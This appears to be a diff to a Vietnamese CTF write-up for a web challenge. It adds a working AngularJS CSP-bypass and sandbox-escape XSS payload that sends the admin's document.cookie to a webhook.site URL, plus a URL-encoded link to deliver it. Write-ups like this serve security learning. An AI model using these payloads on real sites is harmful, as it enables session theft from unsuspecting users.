@@ -40,10 +40,28 @@ Bạn có thể đọc thêm tại: https://blog.huli.tw/2022/09/01/en/angularjs
 Giờ mình chỉ việc sửa payload một chút để ăn cắp cookie của Admin là xong:
 
 ```html
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
-<div ng-app ng-csp>
-{{$on.curry.call().$eval('alert(1)')}}
-</div>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script><div ng-app ng-csp>{{$on.curry.call().document.defaultView.location='https://webhook.site/5ff8415e-1c7c-46eb-9d75-c69ef358de6b/COOKIE='+document.cookie}}</div>
 ```
 
+Nếu nó không được... Sau một lúc lâu test và có sự trợ giúp của AI thì mình tìm được cách để exfilltrate thông tin thông qua defaultView.location (mình không hiểu sao các hàm thông dụng như fetch() hay dùng document.location=... lại ko được, có lẽ server validate kiểu gì đó chăng 😥)
+
+Nhưng đời lại không như mơ... Hình như bị sandbox nên mình không đọc được cookie, localStorage hay thậm chí cả DOM. Đến lúc này mình tự hỏi không biết có đang đi sai hướng không 😭 Bài Easy chắc không đến mức độ này chứ.
+
+![[Pasted image 20261013111244.png]]
+
+Sau đó mình tìm mãi mới được cách để thoát ra khỏi Sandbox của Angular và thành công lấy được cookie của Admin 😭
+Payload:
+```html
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
+<div ng-app ng-csp>
+  {{$on.curry.call().top.location='https://webhook.site/5ff8415e-1c7c-46eb-9d75-c69ef358de6b/?c='+$on.curry.call().top.document.cookie}}
+</div>
+```
+Send to admin:
+```
+http://web/index.php?msg=%3Cscript%20src%3D%22https%3A%2F%2Fcdnjs.cloudflare.com%2Fajax%2Flibs%2Fprototype%2F1.7.2%2Fprototype.js%22%3E%3C%2Fscript%3E%3Cscript%20src%3D%22https%3A%2F%2Fcdnjs.cloudflare.com%2Fajax%2Flibs%2Fangular.js%2F1.0.1%2Fangular.js%22%3E%3C%2Fscript%3E%3Cdiv%20ng-app%20ng-csp%3E%7B%7B%24on.curry.call().top.location%3D'https%3A%2F%2Fwebhook.site%2F5ff8415e-1c7c-46eb-9d75-c69ef358de6b%2F%3Fc%3D'%2B%24on.curry.call().top.document.cookie%7D%7D%3C%2Fdiv%3E
+```
+
+
+![[Pasted image 20261013112043.png]]
